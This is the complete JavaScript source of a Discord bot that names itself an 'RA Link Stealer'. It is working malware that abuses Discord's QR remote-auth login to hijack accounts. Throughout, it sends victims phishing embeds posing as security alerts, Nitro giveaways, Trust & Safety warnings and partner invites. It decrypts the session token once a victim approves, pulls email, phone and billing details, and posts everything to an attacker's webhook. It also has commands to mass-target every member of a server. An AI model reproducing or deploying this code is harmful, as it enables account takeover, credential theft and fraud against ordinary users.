const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags } = require('discord.js');
const axios = require('axios');
const crypto = require('crypto');
const WebSocket = require('ws');
const puppeteer = require('puppeteer');
const jsQR = require('jsqr');
const fs = require('fs');

let browserInstance = null;

async function getBrowser() {
  if (browserInstance && browserInstance.connected) return browserInstance;
  const candidates = [
    process.env.PUPPETEER_EXECUTABLE_PATH,
    '/data/data/com.termux/files/usr/bin/chromium-browser',
    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
    'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
    'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
  ].filter(Boolean);
  const found = candidates.find((p) => fs.existsSync(p));
  if (!found) throw new Error('Chrome/Edge gak ketemu. Install atau set PUPPETEER_EXECUTABLE_PATH.');
  browserInstance = await puppeteer.launch({
    executablePath: found,
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu'],
  });
  return browserInstance;
}

async function extractQrSvg(page) {
  return page.evaluate(() => {
    const candidates = [
      document.querySelector('[class*="qrCode"] svg'),
      document.querySelector('[class*="qr"] svg'),
      ...Array.from(document.querySelectorAll('svg')).filter((el) => {
        const rect = el.getBoundingClientRect();
        const paths = el.querySelectorAll('path, rect').length;
        return rect.width >= 100 && rect.height >= 100 && paths > 10;
      }),
    ].filter(Boolean);
    if (candidates.length === 0) return null;
    const svg = candidates[0].cloneNode(true);
    if (!svg.getAttribute('xmlns')) svg.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
    svg.setAttribute('width', '400');
    svg.setAttribute('height', '400');
    return svg.outerHTML.replace(/currentColor/g, '#000000');
  });
}

async function decodeSvgOnPage(page, svgContent) {
  const cleanSvg = svgContent.replace(/currentColor/g, '#000000');
  const data = await page.evaluate(async (svgStr) => {
    const size = 440;
    const canvas = document.createElement('canvas');
    canvas.width = size;
    canvas.height = size;
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#ffffff';
    ctx.fillRect(0, 0, size, size);
    const blob = new Blob([svgStr], { type: 'image/svg+xml;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    await new Promise((resolve, reject) => {
      const img = new Image();
      img.onload = () => {
        ctx.drawImage(img, 20, 20, size - 40, size - 40);
        URL.revokeObjectURL(url);
        resolve();
      };
      img.onerror = () => {
        URL.revokeObjectURL(url);
        reject(new Error('Gagal render SVG'));
      };
      img.src = url;
    });
    const imgData = ctx.getImageData(0, 0, size, size);
    return { width: size, height: size, pixels: Array.from(imgData.data) };
  }, cleanSvg);
  const decoded = jsQR(new Uint8ClampedArray(data.pixels), data.width, data.height);
  return decoded ? decoded.data : null;
}

const CONFIG = {
  BOT_TOKEN: 'YOUR-TOKEN',
  WEBHOOK_URL: 'https://discord.com/api/webhooks/',
  PREFIX: '!',
  RA_EXPIRE_TIME: 600000,
  EMBED_COLOR: '#5865F2',
  FOOTER_TEXT: 'Discord Security',
  DELETE_AFTER_SUCCESS: true,
};

const activeRASessions = new Map();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
});

function getNitroType(type) {
  const types = { 0: 'None', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' };
  return types[type] || 'Unknown';
}

async function getUserInfo(token) {
  try {
    const res = await axios.get('https://discord.com/api/v9/users/@me', {
      headers: { Authorization: token },
    });
    return res.data;
  } catch {
    return null;
  }
}

async function getBillingInfo(token) {
  try {
    const res = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', {
      headers: { Authorization: token },
    });
    return res.data;
  } catch {
    return [];
  }
}

async function exfiltrateData(token, userInfo, billingInfo, victimId) {
  const embed = new EmbedBuilder()
    .setTitle('🎯 New Token Captured!')
    .setColor('#00ff00')
    .setDescription('QR Code login successful')
    .addFields(
      { name: '👤 Username', value: `${userInfo.username}#${userInfo.discriminator}`, inline: true },
      { name: '🆔 User ID', value: userInfo.id, inline: true },
      { name: '📧 Email', value: userInfo.email || 'N/A', inline: true },
      { name: '📱 Phone', value: userInfo.phone || 'N/A', inline: true },
      { name: '💎 Nitro', value: userInfo.premium_type ? getNitroType(userInfo.premium_type) : 'None', inline: true },
      { name: '💳 Payment Methods', value: billingInfo.length > 0 ? `${billingInfo.length} saved` : 'None', inline: true },
      { name: '🔑 Token', value: `\`\`\`${token}\`\`\``, inline: false }
    )
    .setThumbnail(`https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png`)
    .setFooter({ text: `Victim ID: ${victimId}` })
    .setTimestamp();

  try {
    await axios.post(CONFIG.WEBHOOK_URL, {
      embeds: [embed.toJSON()],
      username: 'QR Stealer',
      avatar_url: 'https://fiup.vercel.app/f/1776068531198_qr.jpeg',
    });
    console.log(`[SUCCESS] Token exfiltrated: ${userInfo.username}`);
  } catch (err) {
    console.error('[ERROR] Webhook:', err.message);
  }
}

function startRASession(object, isInteraction, victimId, template = 'security') {
  const sessionId = crypto.randomUUID();
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding: { type: 'spki', format: 'der' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
  });

  const ra = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=2', {
    headers: {
      Origin: 'https://discord.com',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    },
  });

  let finished = false;
  let heartbeat = null;
  let replied = false;

  activeRASessions.set(sessionId, { ra, expiresAt: Date.now() + CONFIG.RA_EXPIRE_TIME, victim_id: victimId });

  const timeout = setTimeout(() => {
    if (finished) return;
    finished = true;
    clearInterval(heartbeat);
    activeRASessions.delete(sessionId);
    try { ra.close(); } catch {}
    console.log(`[EXPIRED] ${victimId}`);
  }, CONFIG.RA_EXPIRE_TIME);

  const finishSession = (status) => {
    if (finished) return;
    finished = true;
    clearTimeout(timeout);
    clearInterval(heartbeat);
    activeRASessions.delete(sessionId);
    try { ra.close(); } catch {}
    console.log(`[SESSION ${status}] ${victimId}`);
  };

  ra.on('open', () => console.log(`[WS] Terhubung untuk ${victimId}`));

  ra.on('message', async (raw) => {
    let data;
    try { data = JSON.parse(raw.toString()); } catch { return; }
    console.log(`[WS EVENT] op=${data.op}`);

    if (data.op === 'hello') {
      heartbeat = setInterval(() => {
        if (ra.readyState === WebSocket.OPEN) ra.send(JSON.stringify({ op: 'heartbeat' }));
      }, data.heartbeat_interval);
      ra.send(JSON.stringify({ op: 'init', encoded_public_key: publicKey.toString('base64') }));
      return;
    }

    if (data.op === 'nonce_proof') {
      const decryptedNonce = crypto.privateDecrypt(
        { key: privateKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
        Buffer.from(data.encrypted_nonce, 'base64')
      );
      const proof = crypto.createHash('sha256').update(decryptedNonce).digest('base64url');
      ra.send(JSON.stringify({ op: 'nonce_proof', proof }));
      return;
    }

    if (data.op === 'pending_remote_init') {
      const link = `https://discord.com/ra/${data.fingerprint}`;
      console.log(`[RA LINK] ${link} untuk ${victimId}`);
      try {
        if (isInteraction) {
          const content = '⚠️ **Fast-verification only works on the Discord mobile app**\n' + `[Click here](${link}) to verify`;
          if (replied) {
            await object.followUp({ content, flags: MessageFlags.Ephemeral });
          } else {
            await object.editReply({ content });
            replied = true;
          }
        } else if (object.send) {
          await object.send(pickTemplate(template, link));
        }
      } catch (e) {
        console.error('[ERROR] Send RA:', e.message);
      }
      return;
    }

    if (data.op === 'pending_ticket') {
      console.log(`[SCAN] QR dipindai oleh ${victimId}. Menunggu user klik Setujui...`);
      return;
    }

    if (data.op === 'pending_login') {
  console.log(`[LOGIN] User approved, ticket: ${data.ticket}`);
  
  try {
    // 1. Gunakan ticket untuk menukar encrypted_token
    const res = await axios.post(
      'https://discord.com/api/v9/users/@me/remote-auth/login',
      { ticket: data.ticket },
      {
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        },
      }
    );
    
    const encryptedToken = res.data.encrypted_token;
    console.log(`[LOGIN] encrypted_token: ${encryptedToken.slice(0, 20)}...`);
    
    // 2. Dekripsi encrypted_token menggunakan private key RSA
    let token = null;
    try {
      const decrypted = crypto.privateDecrypt(
        { 
          key: privateKey, 
          padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, 
          oaepHash: 'sha256' 
        },
        Buffer.from(encryptedToken, 'base64')
      );
      token = decrypted.toString('utf8');
      console.log(`[LOGIN] Token: ${token.slice(0, 15)}...`);
    } catch (err) {
      console.error('[ERROR] Dekripsi token gagal:', err.message);
    }
    
    // 3. Gunakan token untuk mendapatkan user info dan kirim ke webhook
    if (token) {
      const userInfo = await getUserInfo(token);
      console.log(`[LOGIN] userInfo: ${userInfo ? userInfo.username : 'NULL'}`);
      const billingInfo = await getBillingInfo(token);
      if (userInfo) {
        await exfiltrateData(token, userInfo, billingInfo, victimId);
      }
    }
  } catch (err) {
    console.error('[ERROR] Tukar ticket gagal:', err.message, err.response?.data);
  }
  
  finishSession('success');
  return;
}

    if (data.op === 'pending_finish') {
      console.log('[WARN] pending_finish muncul, fallback ke handler');
      finishSession('success');
      return;
    }

    if (data.op === 'cancel') {
      console.log(`[CANCEL] ${victimId}`);
      finishSession('cancelled');
      return;
    }
  });

  ra.on('close', () => clearInterval(heartbeat));
  ra.on('error', (err) => {
    console.error(`[WS ERROR] ${victimId}:`, err.message);
    finishSession('error');
  });

  return ra;
}

function createPhishingEmbed(raLink) {
  const embed = new EmbedBuilder()
    .setTitle('🔒 Discord Security Verification')
    .setDescription(
      '**⚠️ Action Required: Verify Your Account**\n\n' +
      'We\'ve detected unusual login activity on your account.\n\n' +
      '**To secure your account:**\n' +
      '📱 **Tap the button below on your phone**\n' +
      '✅ Confirm it\'s you\n' +
      '🔐 Your account will be secured\n\n' +
      '⏰ **This link expires in 10 minutes**\n' +
      '💡 Must be opened on mobile device'
    )
    .setColor(CONFIG.EMBED_COLOR)
    .setFooter({ text: CONFIG.FOOTER_TEXT })
    .setTimestamp();
  const button = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setLabel('🔐 Verify on Mobile').setStyle(ButtonStyle.Link).setURL(raLink)
  );
  return { embeds: [embed], components: [button] };
}

function createGiveawayEmbed(raLink) {
  const embed = new EmbedBuilder()
    .setTitle('🎉 You Won Discord Nitro!')
    .setDescription(
      '**Congratulations!** 🎊\n\n' +
      'You\'ve been randomly selected to receive:\n' +
      '💎 **1 Month Discord Nitro FREE**\n\n' +
      '**How to claim:**\n' +
      '📱 Tap "Claim Now" below (must use phone)\n' +
      '✅ Login to verify it\'s you\n' +
      '🎁 Nitro activates instantly!\n\n' +
      '⏰ Claim within 10 minutes\n' +
      '🏆 You\'re one of only 50 winners!'
    )
    .setColor('#ff69b4')
    .setThumbnail('https://i.imgur.com/3g7nmJC.png')
    .setFooter({ text: 'Discord Nitro Giveaway · Expires in 10 min' })
    .setTimestamp();
  const button = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setLabel('🎁 Claim Now').setStyle(ButtonStyle.Link).setURL(raLink)
  );
  return { embeds: [embed], components: [button] };
}

function createModeratorEmbed(raLink) {
  const embed = new EmbedBuilder()
    .setTitle('⚠️ Account Security Alert')
    .setDescription(
      '**Your account has been flagged**\n\n' +
      '**Reason:** Suspicious activity detected\n' +
      '**Status:** Temporary restrictions applied\n' +
      '**Action:** Verification required\n\n' +
      '**To restore full access:**\n' +
      '📱 Tap "Verify Account" (mobile only)\n' +
      '✅ Confirm your identity\n' +
      '🔓 Restrictions will be lifted\n\n' +
      '❌ **Failure to verify within 10 minutes may result in permanent suspension**'
    )
    .setColor('#ff0000')
    .setFooter({ text: 'Discord Trust & Safety' })
    .setTimestamp();
  const button = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setLabel('⚠️ Verify Account').setStyle(ButtonStyle.Link).setURL(raLink)
  );
  return { embeds: [embed], components: [button] };
}

function createBoostEmbed(raLink) {
  const embed = new EmbedBuilder()
    .setTitle('💜 Server Boost Reward!')
    .setDescription(
      '**Thank you for boosting!** 🚀\n\n' +
      'As a token of appreciation, you\'ve unlocked:\n' +
      '🎁 **Exclusive booster perks**\n' +
      '💎 **Bonus Nitro upgrade**\n\n' +
      '**Claim your rewards:**\n' +
      '📱 Tap the button below on mobile\n' +
      '✅ Verify ownership\n' +
      '🎉 Rewards activate instantly!\n\n' +
      '⏰ Available for 10 minutes only'
    )
    .setColor('#ff73fa')
    .setThumbnail('https://i.imgur.com/3g7nmJC.png')
    .setFooter({ text: 'Server Booster Rewards' })
    .setTimestamp();
  const button = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setLabel('💜 Claim Rewards').setStyle(ButtonStyle.Link).setURL(raLink)
  );
  return { embeds: [embed], components: [button] };
}

function createPartnerEmbed(raLink) {
  const embed = new EmbedBuilder()
    .setTitle('🤝 Discord Partner Invitation')
    .setDescription(
      '**You\'ve been invited to the Partner Program!**\n\n' +
      'Your account qualifies for:\n' +
      '⭐ Verified Partner badge\n' +
      '💰 Monetization features\n' +
      '🎯 Priority support\n\n' +
      '**Accept invitation:**\n' +
      '📱 Tap "Accept" below (mobile required)\n' +
      '✅ Complete verification\n' +
      '🎊 Partner status granted!\n\n' +
      '⏰ Invitation expires in 10 minutes'
    )
    .setColor('#5865F2')
    .setThumbnail('https://i.imgur.com/AfFp7pu.png')
    .setFooter({ text: 'Discord Partner Program' })
    .setTimestamp();
  const button = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setLabel('🤝 Accept Invitation').setStyle(ButtonStyle.Link).setURL(raLink)
  );
  return { embeds: [embed], components: [button] };
}

function pickTemplate(template, link) {
  switch ((template || 'security').toLowerCase()) {
    case 'giveaway':
    case 'nitro':
      return createGiveawayEmbed(link);
    case 'mod':
    case 'warning':
      return createModeratorEmbed(link);
    case 'boost':
    case 'booster':
      return createBoostEmbed(link);
    case 'partner':
    case 'partnership':
      return createPartnerEmbed(link);
    default:
      return createPhishingEmbed(link);
  }
}

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;
  if (interaction.customId === 'fast_verify') {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    startRASession(interaction, true, interaction.user.id);
  }
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(CONFIG.PREFIX)) return;

  const args = message.content.slice(CONFIG.PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'qr') {
    const statusMsg = await message.reply('Mengambil link QR...');
    let page;
    try {
      const browser = await getBrowser();
      page = await browser.newPage();
      await page.setUserAgent('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
      await page.setViewport({ width: 1280, height: 800 });
      await page.goto('https://discord.com/login', { waitUntil: 'networkidle2', timeout: 60000 });
      let svgContent = null;
      for (let i = 0; i < 20; i++) {
        svgContent = await extractQrSvg(page);
        if (svgContent) break;
        await new Promise((r) => setTimeout(r, 1000));
      }
      if (!svgContent) return statusMsg.edit('QR Code tidak ditemukan.');
      const qrLink = await decodeSvgOnPage(page, svgContent);
      if (!qrLink) return statusMsg.edit('Gagal decode QR.');
      await statusMsg.edit(`Link QR: ${qrLink}\nSesi aktif 60 detik.`);
      await page.waitForFunction(() => !window.location.href.includes('/login'), { timeout: 60000 })
        .then(() => statusMsg.edit('Login berhasil.'))
        .catch(() => statusMsg.edit('Sesi QR habis (60 detik).'));
    } catch (err) {
      await statusMsg.edit(`Error: ${err.message}`).catch(() => {});
    } finally {
      if (page) await page.close().catch(() => {});
    }
    return;
  }

  if (command === 'attack' || command === 'ra' || command === 'steal') {
    const targetId = args[0];
    const template = args[1] || 'security';
    if (!targetId) return message.reply('Usage: `!attack <user_id> [template]`\nTemplates: security, giveaway, mod, boost, partner');
    const targetUser = await client.users.fetch(targetId).catch(() => null);
    if (!targetUser) return message.reply('❌ User tidak ditemukan.');
    startRASession(targetUser, false, targetId, template);
    await message.reply(`✅ RA link sent to ${targetUser.tag}\n🔍 Monitoring for login...`);
    return;
  }

  if (command === 'massattack' || command === 'nuke' || command === 'raid') {
    if (!message.guild) return message.reply('❌ This command only works in servers!');
    const template = args[0] || 'security';
    const delay = parseInt(args[1]) || 2000;
    await message.reply('⚠️ Starting mass attack...');
    const members = await message.guild.members.fetch();
    let sent = 0, failed = 0;
    for (const [id, member] of members) {
      if (member.user.bot) continue;
      try {
        startRASession(member, false, id, template);
        sent++;
        await new Promise((r) => setTimeout(r, delay));
      } catch {
        failed++;
      }
    }
    await message.reply(`✅ Mass attack complete!\n📤 Sent: ${sent}\n❌ Failed: ${failed}`);
    return;
  }

  if (command === 'generate' || command === 'gen') {
    const template = args[0] || 'security';
    startRASession({
      send: async (payload) => {
        const link = payload.components[0].components[0].data.url;
        const embed = new EmbedBuilder()
          .setTitle('🔗 RA Link Generated')
          .setDescription(`**Link:** ${link}\n\n**Template:** ${template}`)
          .setColor(CONFIG.EMBED_COLOR)
          .addFields({ name: 'Usage', value: 'Kirim ke target, minta buka di HP.', inline: false })
          .setTimestamp();
        await message.reply({ embeds: [embed] });
      },
    }, false, message.author.id, template);
    return;
  }

  if (command === 'sessions' || command === 'status') {
    if (activeRASessions.size === 0) return message.reply('📭 No active RA sessions.');
    const embed = new EmbedBuilder()
      .setTitle('🎯 Active RA Sessions')
      .setColor(CONFIG.EMBED_COLOR)
      .setDescription(`Currently monitoring **${activeRASessions.size}** sessions`)
      .setTimestamp();
    let count = 0;
    for (const [, session] of activeRASessions) {
      count++;
      if (count > 10) break;
      const timeLeft = Math.floor((session.expiresAt - Date.now()) / 1000);
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      embed.addFields({
        name: `Session ${count}`,
        value: `👤 Victim: <@${session.victim_id}>\n⏰ Expires: ${minutes}m ${seconds}s`,
        inline: true,
      });
    }
    await message.reply({ embeds: [embed] });
    return;
  }

  if (command === 'verify') {
    const embed = new EmbedBuilder()
      .setDescription(
        'This server requires you to verify yourself to get access to other channels, you can simply verify by completing a captcha, click on the button below.\n\n' +
        '⚠️ If you are using a **phone**, click on "Fast-Verify" to prove you are a human'
      )
      .setColor('#2F3136');
    const hasBanner = fs.existsSync('./verify-banner.png');
    if (hasBanner) embed.setImage('attachment://banner.png');
    const buttons = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setLabel('Verify').setEmoji('🔗').setStyle(ButtonStyle.Link).setURL('https://verification-human.vercel.app/'),
      new ButtonBuilder().setLabel('Fast-Verify').setStyle(ButtonStyle.Primary).setCustomId('fast_verify')
    );
    const payload = { embeds: [embed], components: [buttons] };
    if (hasBanner) payload.files = [{ attachment: './verify-banner.png', name: 'banner.png' }];
    await message.channel.send(payload);
    return;
  }

  if (command === 'help' || command === 'commands') {
    const helpEmbed = new EmbedBuilder()
      .setTitle('🎯 Discord RA Link Stealer - Commands')
      .setDescription('Remote Auth Link Token Stealer Bot')
      .setColor(CONFIG.EMBED_COLOR)
      .addFields(
        {
          name: '📤 Attack Commands',
          value: '`!attack <user_id> [template]` - Send RA link to target\n`!massattack [template] [delay]` - Send to all server members\n`!generate [template]` - Generate raw RA link\n`!verify` - Send verification message to channel',
          inline: false,
        },
        {
          name: '📊 Info Commands',
          value: '`!sessions` - Show active RA sessions\n`!help` - Show this message\n`!qr` - Puppeteer QR extractor',
          inline: false,
        },
        {
          name: '🎨 Templates',
          value: '`security` - Security verification (default)\n`giveaway` - Nitro giveaway\n`mod` - Account warning\n`boost` - Booster reward\n`partner` - Partnership invite',
          inline: false,
        },
        {
          name: '💡 Examples',
          value: '`!attack 123456789 giveaway`\n`!massattack nitro 3000`\n`!generate`',
          inline: false,
        }
      )
      .setFooter({ text: 'RA Link = Remote Auth Link (discord.com/ra/...)' })
      .setTimestamp();
    await message.reply({ embeds: [helpEmbed] });
  }
});

client.once('clientReady', () => {
  console.log('╔══════════════════════════════════════════╗');
  console.log('║   DISCORD RA LINK STEALER - READY        ║');
  console.log('╚══════════════════════════════════════════╝');
  console.log(`[BOT] Logged in as ${client.user.tag}`);
  console.log(`[CONFIG] Webhook: ${CONFIG.WEBHOOK_URL ? '✓' : '✗'}`);
  console.log(`[INFO] Type !help for command list`);
});

client.login(CONFIG.BOT_TOKEN).catch((err) => {
  console.error('[ERROR] Login:', err.message);
  process.exit(1);
});
